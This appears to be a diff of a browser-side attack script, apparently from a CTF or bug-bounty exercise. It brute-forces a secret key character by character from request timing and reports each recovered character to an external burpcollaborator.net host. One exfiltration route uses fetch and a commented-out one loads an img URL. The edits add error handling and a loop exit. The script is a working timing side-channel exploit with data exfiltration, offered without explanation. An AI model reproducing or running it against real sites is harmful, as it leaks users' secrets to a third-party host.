@@ -11,13 +11,23 @@
     function sendKey(k)
     {
         console.log("sendKey:"+k)
-        fetch("http://qqkxpek9c8g1z17v3kas595rqiw8kx.burpcollaborator.net?key="+k)
+        
+    //    var ul= document.getElementById("secrets");
+    //    var li = document.createElement("img");
+    //    li.src = "http://s81a9uym9ibodhw899ouoeei89e02p.burpcollaborator.net?key="+k
+    //    ul.appendChild(li);
+        try {
+            fetch("http://qqkxpek9c8g1z17v3kas595rqiw8kx.burpcollaborator.net?key="+k)
+        } catch(e) {
+            console.log("AA"+e);
+        }
     };
     sendKey("Started")
 
     key = ""
     while (key.length < 3) {
         chars="0123456789-abcdef"
+        bFound=false
         for (var i = 0; i < chars.length; i++) {
             char = chars.charAt(i)
             tk = key+char
@@ -39,14 +49,17 @@
                 } else {
                     sendKey("rt:"+request_time+"INT:"+tk)
                     key=tk
-                    i=chars.length
+                    i=chars.length+1
                 }
+                bFound=true
             }
+        }
+        if (bFound == false) {
+            break
         }
     }
     sendKey("finished:"+key)
 })();
-
 
 </script>
   </body>
